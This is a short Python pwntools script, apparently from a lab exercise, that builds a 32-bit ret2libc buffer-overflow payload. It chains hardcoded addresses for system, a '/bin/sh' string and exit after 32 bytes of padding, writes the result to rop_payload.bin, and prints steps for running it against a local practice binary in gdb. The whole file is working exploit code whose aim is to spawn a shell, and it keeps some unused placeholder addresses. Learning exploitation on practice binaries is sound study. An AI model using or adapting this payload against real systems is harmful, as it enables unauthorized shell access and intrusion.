from pwn import context
from pwnlib.util.packing import p32
import subprocess

context(arch='i386', os='linux')

puts_addr   = 0x00000000   # fill in from gdb
system_addr = 0xf7dc7ce0
exit_addr   = 0xf7db32b0
binsh_addr  = 0xf7f3f167

def main():
    padding = b"A" * 32

    msg1_addr = 0x00000000  # we'll place msg1 in the buffer itself - see below
    msg2_addr = 0x00000000

    # This simpler version just does: system("/bin/sh") then exit()
    # proving the ROP-chain mechanism itself, without the fragile print-loop
    payload = padding
    payload += p32(system_addr)
    payload += b"JUNK"
    payload += p32(binsh_addr)
    payload += p32(exit_addr)

    with open("rop_payload.bin", "wb") as f:
        f.write(payload)

    print("Payload written. Test with: gdb ./prog_bins/overflow_rop")
    print('Then: run "$(cat rop_payload.bin)"')

if __name__ == "__main__":
    main()
